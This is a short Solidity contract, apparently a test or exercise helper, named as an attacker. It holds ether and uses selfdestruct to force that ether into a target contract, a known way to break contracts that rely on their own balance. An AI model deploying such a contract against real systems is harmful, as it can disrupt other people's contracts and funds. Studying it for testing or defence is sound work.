pragma solidity ^0.8.0;

contract AnotherPayableAttacker {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {}

    function triggerDestroy() public {
        selfdestruct(payable(target));
    }
}